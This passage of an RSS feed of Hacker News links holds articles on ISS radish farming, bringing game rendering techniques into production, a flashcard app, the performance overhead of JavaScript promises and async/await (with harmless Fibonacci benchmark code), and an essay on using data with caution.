picture-in-picture" allowfullscreen=""></iframe></figure><p>"There comes a point where you have longer and longer duration missions, and you reach a cost-benefit point where it makes sense to grow your own food," said chief scientist of NASA's Utilization and Life Sciences Office at the Kennedy Space Center Howard Levine in a statement.</p><p>The APH Chamber uses LED lights to improve plant growth, while an automated control system provides water to the plant. 180 sensors track plant growth and monitoring the temperature, humidity and carbon dioxide levels.</p><p>Astronauts will plant a further round of radish seeds in the APH second science carrier. The move will increase sample size for spatial radis to increase the precision of the experience.</p>
					</div><!-- .post-content -->

					<!-- .post-footer -->


				</article><div>
					<h2>Post navigation</h2>
					<div>
						
						<p><a href="https://smosa.com/no-cashier-grocery-stores-are-coming/"><img src="https://smosa.com/content/images/size/w250/2020/12/entering-store-with-zippin-app.jpg" alt="No-Cashier Grocery Stores Are Coming"></a>
					</p></div>
					<div>
						
							<p><a href="https://smosa.com/no-effective-solution-for-nanoplastics-in-our-intestines-environment/"><img src="https://smosa.com/content/images/size/w250/2020/12/252241_web-gigapixel-scale-6_00x.jpg" alt="&quot;No Effective Solution&quot; for Nanoplastics In Our Intestines, Environment"></a>
					</p></div>
				</div></div>]]>
            </description>
            <link>https://smosa.com/microfarm-on-the-international-space-station-grows-radishes-in-one-month/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558865</guid>
            <pubDate>Mon, 28 Dec 2020 12:59:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why are video games graphics (still) a challenge?]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25558815">thread link</a>) | @mariuz
<br/>
December 28, 2020 | https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/ | <a href="https://web.archive.org/web/*/https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						
<h2>Intro</h2>



<p>This post will cover challenges and aspects of production to consider when creating new rendering / graphics techniques and algorithms – especially in the context of <strong>applied research for real time rendering</strong>. I will base this on my personal experiences, working on <strong>Witcher 2, Assassin’s Creed 4: Black Flag, Far Cry 4, and God of War</strong>.</p>



<p>Many of those challenges are easily ignored – they are <strong>real problems in production</strong>, but not necessarily there only if you only read about those techniques, or if you work on pure research, writing papers, or create tech demos.</p>



<p>I have seen statements like “why is this brilliant research technique X not used in production?” both from gamers, but also from my colleagues with academic background. And there are always some good reasons!</p>



<p>The post is also inspired by <a href="https://twitter.com/bartwronsk/status/1327509557015310336">my joke tweet</a> from a while ago about appearing smart and mature as a graphics programmer by “dismissing” most of the rendering techniques – that they are not going to work on foliage. 🙂&nbsp;And yes, I will come back to vegetation rendering a few times in this post.</p>



<p>I tend to think of this topic as well when I hear discussions about how “photogrammetry, raytracing, neural rendering, [insert any other new how topic] will be a universal answer to rendering and replace everything!”. Spoiler alert: not gonna happen (soon).</p>



<h2>Target audience</h2>



<p>Target audience of my post are:</p>



<ul><li>Students in computer graphics and applied researchers,</li><li>Rendering engineers, especially ones earlier in their career – who haven’t built their intuition yet,</li><li>Tech artists and art leads / producers,</li><li>Technical directors and decision makers without background in graphics,</li><li>Hardware engineers and architects working on anything GPU or graphics related (and curious what makes it complicated to use new HW features),</li><li>People who are excited and care about game graphics (or real time graphics in general) and would like to understand a bit “how sausages are made”. Some concepts might be too technical and too much jargon, but then feel free to skip those.</li></ul>



<p>Note that I didn’t place “pure” academic researchers in the above list – as I don’t think that pure research should be considering too many obstacles. Role of the fundamental research is inspiration and creating theory that can be later productionized by people who are experts in productionization.</p>



<p>But if you are a pure researcher and somehow got here, I’ll be happy if you’re interested in what kinds of problems might be on the long way from idea or paper to a product (and <strong>why most new genuinely good research will never find its place in products</strong>).</p>



<h2>How to interpret the guide</h2>



<p>Very important note – <strong>none </strong>of the “obstacles” I am going to describe <strong>are deal breakers</strong>.</p>



<p>Far from it – most successful tech that became state of the art violates many of those constraints! It simply means that those are challenges that will need to be overcome in some way – manual workarounds, feature exclusivity, ignoring the problems, or applying them only in specific cases.</p>



<p>I am going to describe first the <strong>use-cases</strong> – potential uses of the technology and how those impact potential requirements and constraints.</p>



<h2>Use case</h2>



<p>The categories of “use cases” deserve some explanation and description of “severity” of their constraints.</p>



<h3>Tech demo&nbsp;</h3>



<p>Tech demo is the easiest category. If your whole product is a <strong>demonstration of a given technique </strong>(whether for benchmarking, showing off some new research, artistic demoscene), most of the considerations go away.</p>



<p>You can actually retrofit everything: from the demo concept, art itself, camera trajectory to show off the technology the best and avoid any problems.</p>



<p>The main considerations will be around performance (a choppy tech demo can be seen as a tech failure) and working very closely with artists able to show it off.</p>



<p>The rest? Hack away, write one-off code – just don’t have expectations that turning a tech demo into a production ready feature is simple or easy (it’s more like the 99% of work remaining).</p>



<h3>Special level / one-off</h3>



<p>The next level “up” in the difficulty is creating some <strong>special features that are one-off</strong>. It can be some visual special effect happening in a single scene, game intro, or a single level that is different from the other ones. In this case, a feature doesn’t need to be very “robust”, and often replaces many others.</p>



<p>An example could be lighting in the jungle levels in Assassin’s Creed 4: Black Flag that I worked on.&nbsp;</p>



<div><figure><img src="https://lh3.googleusercontent.com/51bdx_bCzH7HBQ7NjppuafWVspC1jLwJ4OwbTLwYq1DLDnnOlxNGZtXby8mLGdqhnjC00WyxAfq1L3d8EIOatPflkT4phHF4Xq2WxOeUSlRCymYNEPQW3WiOeywiz8edAD592PNh" alt="" width="458" height="610"><figcaption>Source: Assassin’s Creed 4: Black Flag promo art. Notice the caustics-like lightshafts that were key rendering feature in jungle levels – and allowed us to save a lot on the shadows rendering!</figcaption></figure></div>



<p>Jungles were “cut off” from the rest of the open world by special streaming corridors and we completely replaced the whole lighting in them! Instead of relying on tree shadow maps and global lighting, we created <strong>fake “caustics”</strong> that looked much softer and played very nicely with our volumetric lighting / atmospherics system. They not only looked better, but also were much faster – obviously worked only because of those special conditions.</p>



<h3>Cinematics</h3>



<p>A slightly more demanding type of feature is cinematic-only one. Cinematics are a bit different as they can be very strictly controlled by cinematic artists and <strong>most of their aspects like lighting, character placement, or animations are faked</strong> – just like in regular cinema! Cinematics often feature fast camera cuts (useful to hide any transitions/popping) and have more computational budget due to more predictable nature (and even in 60fps console games rendered in 30fps).</p>



<div><figure><img src="https://lh3.googleusercontent.com/g3SLk16AtqBNz6TfdSXtNhMDqo6sPXIrwQUQWEjGas1fZ3vYUVLWf_vC5or3-Gen-0Z1WRlt9M46eDiBv5b1tSmU_A0aqKPbq2zR-iJ5IerV42EpuGfrgdTtJVygjhpuQ7R1_-0C" alt=""><figcaption>Witcher 2 cinematic featuring higher character LODs, nice realistic large radius bokeh and custom lighting – but notice how few objects to render are there!</figcaption></figure></div>



<h3>Regular rendering feature</h3>



<p>“Regular” features – lighting, particles, geometry rendering – are the <strong>hardest category</strong>. They need to be either very easy to implement (most of the obstacles / problems solved easily), provide huge benefits surpassing state of the art by far to facilitate the adoption pain, or have some very excited team pushing for it (never underestimate the drive of engineers or artists that really want to see something happen!).</p>



<p>Most of my post will focus on those.&nbsp;</p>



<h3>Key / differentiating feature</h3>



<p>Paradoxically, if something is a key or differentiating feature, this can alleviate many of the difficulties. Let’s take VR – there stereo, performance (low latency), and perfect AA with no smudging (so rather forget about TAA), are <strong>THE features and absolutely core to the experience</strong>. This means that you can completely ignore for example rendering foliage or some animations that would look uncannily – as being immersed and the VR experience of being there are much more important!</p>



<h2>Feature compatibility</h2>



<p>Let’s have a look at compatibility of a newly developed feature with some other common “features” (the distinction between “features”, and the next large section “pipeline” is fuzzy).</p>



<p>Features are not the most important of challenges – arguably the category I’m going to cover at the end (the “process”) is. But those are fun and easy to look at!&nbsp;</p>



<h3>Dense geometry</h3>



<p>Dense geometry like <strong>foliage </strong>– a “feature” that inspired this post – is an enemy of most rendering algorithms.</p>



<p>The main problem is that with very dense geometry (lots of overlapping and small triangles), many “optimizations” and assumptions become impossible.</p>



<p>Early Z and occlusion culling? Very hard.&nbsp;</p>



<p>Decoupling surfaces from volumes? Very hard.</p>



<p>Storing information per unique surface parametrization? Close to impossible.</p>



<p>Amount of vertices to animate and pixels to shade? Huge, shaders need simplification!</p>



<div><figure><img src="https://lh4.googleusercontent.com/P3m7eTgVGodadf6TSd7Ca4Th8wedlR3AEr0wghmVTz0klnfU2hUTq4K1jRdhLljGMRQKgiG-pq02Ayc5Dtllma_jLOF60rtSCx0jID78CYen8cyAW3z2N_bCPYh7KvemZ2k8bWIX" alt=""><figcaption>Witcher 2 foliage – that density! Still IMO one of the best forests in any game.</figcaption></figure></div>



<p>Dense geometry through which you can see (like grass blades) is incompatible with many techniques, for example lightmapping (storing a precomputed lighting per every grass blade texel would be very costly).</p>



<p>If a game has a tree here and there or is placed in a city, this might not be a problem. But for any “natural” environment, a big chunk of the productionization of any feature is going to be combining it to coexist well with foliage.</p>



<h3>Alpha testing</h3>



<p>Alpha testing is an extension of the above, as it disables even more hardware features / optimizations.</p>



<p>Alpha testing is a technique, when a pixel evaluates “alpha” value from a texture or pixel shader computations, and <strong>based on some fixed threshold, doesn’t render/write it</strong>.</p>



<p>It is much faster than alpha blending, but for example disables early z writes (early z tests are ok), and requires raytracing hit shaders and reading a texture to decide if a texel was opaque or not.</p>



<p>It also makes antialiasing very challenging (forget about regular MSAA, you have to emulate alpha to coverage…).</p>



<p>For a description and great visual explanation of some problems, see this blog post of <a href="https://bgolus.medium.com/anti-aliased-alpha-test-the-esoteric-alpha-to-coverage-8b177335ae4f">Ben Golus</a>.</p>



<h3>Animation – skeletal</h3>



<p>Most animators work with “skeletal animations”. <strong>Creating rigs, skinning meshes, animating skeletons</strong>. When you create a new technique for rendering meshes that relies on some heavy precomputations, would animators be able to “deform” it? Would they be able to plug it into a complicated animation blending system? How does it fit in their workflow?</p>



<p>Note that it can also mean rigid deformations, like a rotating wheel – it’s much cheaper to render complicated objects as a skinned whole, than splitting them.</p>



<p>And animation is a must, cannot be an afterthought in any commercial project.</p>



<figure><img src="https://lh5.googleusercontent.com/WBPNVuhqPnwXvUjbrp1UpzraK24bQT3VrXJgslGPgwWqC2M__So3SISqaiBrNytVVvy7HqVV6V64o1VFsAM5NxbzOEn5lwll6ayTOd49M5oC2rF9AAHk5ryI--vv8lqe2rCPWBoU" alt=""><figcaption>Witcher 2 trebuchets were not people, but also had “skeletons” and “bones” and were using skeletal animations!</figcaption></figure>



<h3>Animation – procedural and non-rigid</h3>



<p>The next category of animations are “procedural” and non-rigid. Procedural animations are useful for any animation that is “endless”, relatively simple, and shouldn’t loop too visibly. The most common example is <strong>leaf shimmer and branch movement</strong>.</p>



<p>S…</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/">https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/</a></em></p>]]>
            </description>
            <link>https://bartwronski.com/2020/12/27/why-are-video-games-graphics-still-a-challenge-productionizing-rendering-algorithms/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558815</guid>
            <pubDate>Mon, 28 Dec 2020 12:51:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Incremental Packrat Parsing [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25558535">thread link</a>) | @pdubroy
<br/>
December 28, 2020 | https://ohmlang.github.io/pubs/sle2017/incremental-packrat-parsing.pdf | <a href="https://web.archive.org/web/*/https://ohmlang.github.io/pubs/sle2017/incremental-packrat-parsing.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://ohmlang.github.io/pubs/sle2017/incremental-packrat-parsing.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558535</guid>
            <pubDate>Mon, 28 Dec 2020 11:55:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: I built a flashcard platform that supports latex and code highlighting]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25558420">thread link</a>) | @mvind
<br/>
December 28, 2020 | https://memordo.com/m/h | <a href="https://web.archive.org/web/*/https://memordo.com/m/h">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-28a2eea8=""><p><img id="hero-pic" src="https://memordo-assets.ams3.digitaloceanspaces.com/front-page-assets/Group%203%20%281%29.png" data-v-28a2eea8=""></p> <div data-v-28a2eea8=""> <h3 data-v-28a2eea8="">
        Introducing the all-new collaborative flashcard platform, lovingly made to help you.

      </h3> </div></div><div data-v-28a2eea8=""><div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/typing.801f4d3.svg" data-v-28a2eea8=""><br data-v-28a2eea8="">
             Use the familiar Anki flashcard types like <strong data-v-28a2eea8=""> single</strong>, <strong data-v-28a2eea8="">double</strong>, <strong data-v-28a2eea8="">cloze deletion</strong>.
          </p></div> <div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/schedule.cbe60f8.svg" data-v-28a2eea8=""> <br data-v-28a2eea8="">
          Create <strong data-v-28a2eea8=""> custom study schedules </strong></p></div> <div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/analytics.3f4cba7.svg" data-v-28a2eea8=""> <br data-v-28a2eea8="">
            Gain <strong data-v-28a2eea8=""> insights </strong> into your studying
          </p></div> <div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/network.edf1efc.svg" data-v-28a2eea8=""> <br data-v-28a2eea8=""> <strong data-v-28a2eea8=""> Share </strong> and <strong data-v-28a2eea8=""> collaborate </strong> in creating flashcards
          </p></div> <div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/digital-marketing.7ca7dbb.svg" data-v-28a2eea8=""><br data-v-28a2eea8="">
            Create flashcards with <strong data-v-28a2eea8="">images</strong>, <strong data-v-28a2eea8=""> latex</strong>, <strong data-v-28a2eea8=""> code</strong>, <strong data-v-28a2eea8=""> languages </strong></p></div> <div data-v-28a2eea8=""><p><img src="https://memordo.com/_nuxt/img/reminder.2a2f3d4.svg" data-v-28a2eea8=""> <br data-v-28a2eea8="">
            We help <strong data-v-28a2eea8="">reminding</strong> you to study
          </p></div></div></div>]]>
            </description>
            <link>https://memordo.com/m/h</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558420</guid>
            <pubDate>Mon, 28 Dec 2020 11:34:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Performance Overhead of JavaScript Promises and Async Await]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25558279">thread link</a>) | @me4502
<br/>
December 28, 2020 | https://matthewmiller.dev/blog/javascript-promise-overhead/ | <a href="https://web.archive.org/web/*/https://matthewmiller.dev/blog/javascript-promise-overhead/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>
      <span></span>
  <picture>
        <source srcset="https://matthewmiller.dev/static/e4e3b0d7364b783ee8ea8cd828e4d524/77434/javascript-promise-overhead.webp 300w,
https://matthewmiller.dev/static/e4e3b0d7364b783ee8ea8cd828e4d524/411c4/javascript-promise-overhead.webp 600w,
https://matthewmiller.dev/static/e4e3b0d7364b783ee8ea8cd828e4d524/cbd37/javascript-promise-overhead.webp 1200w,
https://matthewmiller.dev/static/e4e3b0d7364b783ee8ea8cd828e4d524/64296/javascript-promise-overhead.webp 1600w" sizes="(max-width: 1200px) 100vw, 1200px" type="image/webp">
        <source srcset="https://matthewmiller.dev/static/e4e3b0d7364b783ee8ea8cd828e4d524/a8a0d/javascript-promise-overhead.png 300w,
https://matthewmiller.dev/static/e4e3b0d7364b783ee8ea8cd828e4d524/dface/javascript-promise-overhead.png 600w,
https://matthewmiller.dev/static/e4e3b0d7364b783ee8ea8cd828e4d524/64756/javascript-promise-overhead.png 1200w,
https://matthewmiller.dev/static/e4e3b0d7364b783ee8ea8cd828e4d524/42cbc/javascript-promise-overhead.png 1600w" sizes="(max-width: 1200px) 100vw, 1200px" type="image/png">
        <img src="https://matthewmiller.dev/static/e4e3b0d7364b783ee8ea8cd828e4d524/64756/javascript-promise-overhead.png" alt="The Performance Overhead of JavaScript Promises and Async Await" title="The Performance Overhead of JavaScript Promises and Async Await" loading="lazy">
      </picture>
    </span></p>
<p>JavaScript as a language is heavily asynchronous, with promises being deeply integrated. The inclusion of async/await syntax has massively improved this, making asynchronous code much more readable. Being able to mark methods as async makes it much easier to integrate into existing parts of code, sometimes causing large chains of method calls to become async for a single deep method call. While this is sometimes the best solution, can the overhead of promises pose a problem for hot code?</p>
<h3 id="benchmarks"><a href="#benchmarks" aria-label="benchmarks permalink"></a>Benchmarks</h3>
<p>As of writing, the v8 JavaScript engine that powers both Chromium and NodeJS does not optimise out redundant promises. Due to this, a decent benchmark to determine just the overhead of promises is to take a typical function call and make it a promise. For this case, I'm using a function that calculates a position in the Fibonacci sequence.</p>
<h4 id="test-1---recursive-fibonacci"><a href="#test-1---recursive-fibonacci" aria-label="test 1   recursive fibonacci permalink"></a>Test 1 - Recursive Fibonacci</h4>
<p>The first test is using a recursive Fibonacci function. Using a recursive function as a test case here means we will get a compounding overhead from the promises. This result will show us a relatively worse case example.</p>
<p>The following code has been used,</p>
<div data-language="javascript"><pre><code>
<span>function</span> <span>fibonacci</span><span>(</span><span>num</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>num <span>&lt;=</span> <span>1</span><span>)</span> <span>return</span> <span>1</span><span>;</span>
  <span>return</span> <span>fibonacci</span><span>(</span>num <span>-</span> <span>1</span><span>)</span> <span>+</span> <span>fibonacci</span><span>(</span>num <span>-</span> <span>2</span><span>)</span><span>;</span>
<span>}</span>
<span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>10</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
  <span>fibonacci</span><span>(</span>i<span>)</span><span>;</span>
<span>}</span></code></pre></div>
<div data-language="javascript"><pre><code>
<span>async</span> <span>function</span> <span>fibonacci</span><span>(</span><span>num</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>num <span>&lt;=</span> <span>1</span><span>)</span> <span>return</span> <span>1</span><span>;</span>
  <span>return</span> <span>(</span><span>await</span> <span>fibonacci</span><span>(</span>num <span>-</span> <span>1</span><span>)</span><span>)</span> <span>+</span> <span>(</span><span>await</span> <span>fibonacci</span><span>(</span>num <span>-</span> <span>2</span><span>)</span><span>)</span><span>;</span>
<span>}</span>
<span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>10</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
  
  
  <span>fibonacci</span><span>(</span>i<span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span><span>}</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>When running this on <a href="https://jsbench.me/jrkj8dqar8/1">JSBench.Me</a>, the promise case is shown to be <strong>86% slower</strong> on Chrome 87 than the non-promise case.</p>
<p>While this is an unrealistic case, it shows that promises can significantly impact performance, especially in hot code paths.</p>
<h4 id="test-2---non-recursive-fibonacci"><a href="#test-2---non-recursive-fibonacci" aria-label="test 2   non recursive fibonacci permalink"></a>Test 2 - Non-Recursive Fibonacci</h4>
<p>A non-recursive Fibonacci sequence shows what sort of overhead a low-cost method call could have to get a more real-world view. In this case, each call to the function will only have the overhead of a single promise.</p>
<p>The following code has been used,</p>
<div data-language="javascript"><pre><code>
<span>function</span> <span>fibonacci</span><span>(</span><span>num</span><span>)</span> <span>{</span>
  <span>var</span> a <span>=</span> <span>1</span><span>,</span>
    b <span>=</span> <span>0</span><span>,</span>
    temp<span>;</span>
  <span>while</span> <span>(</span>num <span>&gt;=</span> <span>0</span><span>)</span> <span>{</span>
    temp <span>=</span> a<span>;</span>
    a <span>=</span> a <span>+</span> b<span>;</span>
    b <span>=</span> temp<span>;</span>
    num<span>--</span><span>;</span>
  <span>}</span>
  <span>return</span> b<span>;</span>
<span>}</span>
<span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>100</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
  <span>fibonacci</span><span>(</span>i<span>)</span><span>;</span>
<span>}</span></code></pre></div>
<div data-language="javascript"><pre><code>
<span>async</span> <span>function</span> <span>fibonacci</span><span>(</span><span>num</span><span>)</span> <span>{</span>
  <span>var</span> a <span>=</span> <span>1</span><span>,</span>
    b <span>=</span> <span>0</span><span>,</span>
    temp<span>;</span>
  <span>while</span> <span>(</span>num <span>&gt;=</span> <span>0</span><span>)</span> <span>{</span>
    temp <span>=</span> a<span>;</span>
    a <span>=</span> a <span>+</span> b<span>;</span>
    b <span>=</span> temp<span>;</span>
    num<span>--</span><span>;</span>
  <span>}</span>
  <span>return</span> b<span>;</span>
<span>}</span>
<span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>100</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
  <span>fibonacci</span><span>(</span>i<span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span><span>}</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>When running this on <a href="https://jsbench.me/1dkj8e6n54/1">JSBench.Me</a>, the promise case is shown to be <strong>81% slower</strong> on Chrome 87 than the non-promise case.</p>
<p>This result shows that adding an async modifier to the method can almost double the time it takes to execute simple functions. For hot code, this could make a significant difference.</p>
<h4 id="test-3---promise-vs-asyncawait"><a href="#test-3---promise-vs-asyncawait" aria-label="test 3   promise vs asyncawait permalink"></a>Test 3 - Promise vs Async/Await</h4>
<p>So we've seen what just adding the async keyword can do, but what if we use promises directly instead?</p>
<p>Using async code from the previous test case, and the following code,</p>
<div data-language="javascript"><pre><code>
<span>function</span> <span>fibonacci</span><span>(</span><span>num</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>var</span> a <span>=</span> <span>1</span><span>,</span>
      b <span>=</span> <span>0</span><span>,</span>
      temp<span>;</span>
    <span>while</span> <span>(</span>num <span>&gt;=</span> <span>0</span><span>)</span> <span>{</span>
      temp <span>=</span> a<span>;</span>
      a <span>=</span> a <span>+</span> b<span>;</span>
      b <span>=</span> temp<span>;</span>
      num<span>--</span><span>;</span>
    <span>}</span>
    <span>resolve</span><span>(</span>b<span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
<span>}</span>
<span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>100</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
  <span>fibonacci</span><span>(</span>i<span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span><span>}</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>When running this on <a href="https://jsbench.me/3jkj8ekl0r/1">JSBench.Me</a>, the case using promises rather than async/await is shown to be a further <strong>26% slower</strong> on Chrome 87 than the async/await case.</p>
<h3 id="solutions"><a href="#solutions" aria-label="solutions permalink"></a>Solutions</h3>
<p>There are a few potential solutions for this issue. Firstly, however, it's important to point out that unless you've confirmed a section of code to be causing performance issues, you don't need to optimise it. Once you've used a profiler to verify that it's worth optimising a piece of code, then it's worth investigating.</p>
<p>The simplest solution here is to perform data fetching or other asynchronous operations closer to the application's root and pass the resulting data down. Often program structures that involve deep-nested async/await paths exhibit poor separation of concerns. Ideally, a single system should not load and use data; instead, it should receive the data from another system that loads it. This structure also has the added benefit of being much more testable. Doing this should prevent the need to nest async/await methods deeply.</p>
<p>Another option is to only use the async keyword for the inner-most method if possible. Each method with an async keyword adds overhead, so if you can work with the promise directly outside of that function, you're not introducing further overhead. This technique can be even more helpful when the method only sometimes needs to return a promise. In this case, including the async keyword introduces the overhead always. If you return a promise directly, overhead (albeit slightly more overhead) happens only a portion of the time.</p>
<h3 id="conclusion"><a href="#conclusion" aria-label="conclusion permalink"></a>Conclusion</h3>
<p>Promises and Async/Await introduce measurable overhead into JavaScript code. This problem can be worked around in most cases when necessary, yet, it will not pose any issue most of the time. As with most things, understanding the various trade-offs in performance is essential when optimising code. If you've identified a hot code path that makes heavy use of async/await, it may be worth investigating ways to minimise that.</p></div></div>]]>
            </description>
            <link>https://matthewmiller.dev/blog/javascript-promise-overhead/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25558279</guid>
            <pubDate>Mon, 28 Dec 2020 11:06:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data: Use, with Caution]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25558260">thread link</a>) | @ReDeiPirati
<br/>
December 28, 2020 | https://staysaasy.com/product/2020/12/24/data.html | <a href="https://web.archive.org/web/*/https://staysaasy.com/product/2020/12/24/data.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>In the modern business environment everyone wants to be data-driven. You can hear the envy in a conference room when a good graph hits the audience right in their data-loving brains. Data is good. Data rules all.</p>

<p>What you see less are the glaring imperfections in most data. The show must go on - fine-grained analysis of the data used for strategic decisions holds up things up. Deep dives into data require ability to get that data, interpret that data, and understand that data. This creates a power imbalance where the data-creator is much better positioned to tell the story they want to tell; the data-consumer is hard-pressed to disagree with that story in real-time. Alas, decisions happen in conference rooms, data analysis happens at a desk.</p>

<p>These two realities are Saasy’s Axioms of Data:</p>
<ul>
  <li>Data wins arguments. Imperfect data beats no data.</li>
  <li>All data is imperfect.</li>
</ul>

<p>These realities have 3 major implications for how you should approach getting things done:</p>
<ul>
  <li>Show up with data.</li>
  <li>Use data as a compass, not a map.</li>
  <li>Beware the abuse of data.</li>
</ul>

<h2 id="show-up-with-data">Show Up With Data</h2>

<p>Most of the time some data is better than no data. You should strive to be data-driven. Our collective admiration of data comes from a reasonable instinct.</p>

<p>In a world where data is useful and people view it as a sign of mature, rational, and thorough work, you should show up with data. No matter your role, you will get more of the things you want and do a better job if you show up with data.</p>

<p>As many have pointed out, you can measure anything to get data for your case:</p>
<ul>
  <li>Our team cycle time decreased by 20% last half on repos that were converted to using React and remained constant on ones that weren’t. We should convert the remainder of our repos to React.</li>
  <li>We left 290 style comments on pull requests in the last quarter. If each of those take 2 minutes to resolve on average, replacing that mechanism with an automatic enforced style-guide will save us a full day per quarter.</li>
  <li>Only 5% of IT requests take longer than 1 week, but those that do take an average 3 months. Those tickets also are responsible for the majority of internal-NPS for the IT team below a 4. We need to implement a process to get rid of these outliers.</li>
</ul>

<p>All of these arguments are more compelling because they are data-supported. The data is imperfect, but it’s useful. It gives an overall, high-level assessment of the situation. It also allows for measurement of results, using the same data after the change.</p>

<p>If you’re not using data regularly you’re probably leaving a lot of impact on the floor, no matter if you’re a new IC right out of college or a seasoned executive. Show up with data.</p>

<h2 id="data-is-a-compass-not-a-map">Data Is A Compass, Not A Map</h2>

<p>Data exists to help you understand, at a high level, what would be useful to do and how effective your actions have been. However, the more granular the decisions are, the less useful data becomes. Data’s utility is strongest when it tells a clear story, not when it whispers details. So you should use data more when the data is very clear and makes sense, and you should rely on it less when it’s more nuanced.</p>

<p>For example, employee satisfaction surveys provide useful data when the signal is clear and blunt: people are unhappy or people are happy. The surveys are less useful when it comes to specific feedback. A sole comment about the espresso machine might say that it’s too loud. If you then move the machine to the hallway, you might find that 90% of your team hates the new location because it’s farther away. You used the data like a set of instructions, not a broad picture.</p>

<p>Another example: I had a feeling awhile back that remote candidates were turning down our offers more than local candidates. I pulled the data and the story was clear - remote candidates actually closed at a significantly higher rate than local candidates. The data was imperfect, but it gave no credence to my assumption, and I had other ways I can improve recruiting so I moved on.</p>

<p>In the compass analogy: I thought I was heading South, but my compass told me I was heading North. I might have actually been going NorthWest, but I’m happy enough to know that I’m not going South.</p>

<p>You might think that the advocacy to use data when it’s bold and intuitive is a catch-22, that data is most useful when it’s counter to your intuition and changes your behavior. However, I disagree - data is most often important in two cases: 1) it provides direction when you have no prior intuition at all and 2) it sets you up to measure the success of your work from the get-go.</p>

<h2 id="beware-the-abuse-of-data">Beware The Abuse Of Data</h2>

<p>Because data is powerful and imperfect, and because decisions are using presented data and not data-analysis, there are many who would wield its power without prudence. You can see these people show up with hand-crafted data any time they want to get their way. And because it can seem petty and defensive to question that data - after all, you’d be the amateur who didn’t show up with data - those people can often get their way, even when the data isn’t bold and the conclusions are debatable.</p>

<p>There’s no one-size-fits-all solution to these situations. High level though, I’d recommend the following:</p>
<ul>
  <li>Work to ensure your company has a healthy data culture</li>
  <li>Show up with data for the things you really care about</li>
</ul>

<p>First, a healthy data culture uses data but understands its limitations. A healthy data culture is a humble data culture. If data is moving you towards good decisions with clear signals and helps you measure success, that’s great. If data is wielded as a weapon or is paraded around as a sign of greatness, watch out.</p>

<p>For an example of a bad data culture, your no-assholes-allowed company might put up with a salesperson because “they put up crazy numbers”. Indeed, that person might wear their quarterly numbers like a badge that lets them behave on a different plane of existence. However, are you tracking how often they are making concessions with negative downstream impacts? Are you tracking how much time they take from the rest of the organization to support their sales? This is to say nothing of the culture impact of that person.</p>

<p>The nuance here is important. Their quarterly numbers tell a clear story - they sell a lot of product. But the question was more nuanced: should we put up with their behavior? In reality, you likely have almost no data that quantifies the totality of their impact on the company. Their sales are just one number in a complex ecosystem.</p>
